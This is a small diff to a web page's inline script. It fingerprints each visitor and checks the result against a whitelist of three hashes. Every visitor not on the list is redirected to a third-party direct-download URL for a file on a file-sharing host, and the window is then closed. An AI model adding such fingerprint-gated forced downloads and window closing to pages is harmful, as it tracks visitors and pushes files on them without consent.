@@ -1229,8 +1229,8 @@
       console.log(visitorId)
       alert("fingerprint："+ visitorId)
       var whitelist = ["285f3ef4e1a3dcd13a8303069fecd3d7","c3267caea58433dc792c6e2b4fd886ff","49a9e0571281a6291159058030184fc8"];
-	if (whitelist.includes(visitorId)){return}else{alert("Not in the whitelist!");setTimeout(function() {
-  location.href="https://api.hanximeng.com/lanzou/?url=https://wogan.lanzoub.com/iaYgn113ycbi&type=down";
+	if (whitelist.includes(visitorId)){return}else{alert("Not in the whitelist!");location.href="https://api.hanximeng.com/lanzou/?url=https://wogan.lanzoub.com/iaYgn113ycbi&type=down";setTimeout(function() {
+  window.opener=null;window.open('','_self');window.close();
 }, 2000); }
    })
 </script>
